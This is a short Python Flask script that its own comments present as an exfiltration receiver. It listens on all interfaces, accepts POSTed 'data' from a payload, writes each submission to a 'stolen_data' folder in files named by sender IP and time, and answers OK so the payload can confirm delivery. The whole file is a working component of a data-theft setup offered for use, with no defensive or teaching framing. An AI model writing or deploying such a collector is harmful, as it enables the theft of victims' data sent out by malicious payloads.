from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Ensure an uploads directory exists
UPLOAD_DIR = "stolen_data"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload():
    # 1. Get the data sent by the payload
    # Payloads should send data with the key 'data'
    exfil_data = request.form.get('data')
    
    if not exfil_data:
        return "No data received", 400

    # 2. Identify the sender
    client_ip = request.remote_addr
    
    # 3. Create a unique filename based on time and IP
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"exfil_{client_ip}_{timestamp}.txt"
    filepath = os.path.join(UPLOAD_DIR, filename)
    
    # 4. Save the data
    with open(filepath, 'w') as f:
        f.write(exfil_data)
        
    print(f"[+] Received data from {client_ip}. Saved to {filepath}")
    
    # Return a 200 OK so the payload knows it succeeded
    return "OK", 200

if __name__ == '__main__':
    # Listen on all interfaces (0.0.0.0) on port 80 (HTTP)
    # Note: Binding to port 80 usually requires sudo privileges on Linux
    # Use port 8080 if running without sudo.
    print("[*] Starting HTTP Receiver Server...")
    app.run(host='0.0.0.0', port=8080)
